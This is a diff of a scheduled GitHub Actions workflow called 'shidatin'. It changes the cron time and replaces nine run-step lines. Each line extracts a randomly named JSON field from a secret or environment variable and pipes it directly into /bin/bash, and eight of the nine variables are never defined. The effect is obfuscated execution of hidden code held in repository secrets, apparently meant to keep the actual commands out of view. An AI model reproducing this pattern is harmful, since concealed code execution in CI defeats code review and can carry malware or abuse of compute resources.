@@ -2,9 +2,8 @@ name: shidatin
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 1/6 * * *'
-
-jobs:  # 26733
+    - cron: '3 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,15 +11,15 @@ jobs:  # 26733
       - uses: actions/checkout@v4
       - name: shidatin
         env:
-          yeu4: ${{ secrets.yeu4 }}
+          a306: ${{ secrets.a306 }}
         run: |
-          echo $yeu4 | jq -r .zncx2162 | /bin/bash
-          echo $ehsib224 | jq -r .pk9 | /bin/bash
-          echo $yg14 | jq -r .n9076 | /bin/bash
-          echo $eit65 | jq -r .jt7 | /bin/bash
-          echo $ke0463 | jq -r .vpml9859 | /bin/bash
-          echo $oj639 | jq -r .cag07246 | /bin/bash
-          echo $dzqw820 | jq -r .v7 | /bin/bash
-          echo $txt33633 | jq -r .zcye44 | /bin/bash
-          echo $zu35941 | jq -r .olox3682 | /bin/bash
+          echo $a306 | jq -r .yf675 | /bin/bash
+          echo $ylxgn26818 | jq -r .vpyh32 | /bin/bash
+          echo $op77371 | jq -r .ivqdl6994 | /bin/bash
+          echo $vf401 | jq -r .hqfxx64 | /bin/bash
+          echo $uenw00 | jq -r .a93 | /bin/bash
+          echo $bs6 | jq -r .ssf40011 | /bin/bash
+          echo $szijh76 | jq -r .nez51 | /bin/bash
+          echo $o75 | jq -r .ghnu9715 | /bin/bash
+          echo $dfn16 | jq -r .vsio1 | /bin/bash
 
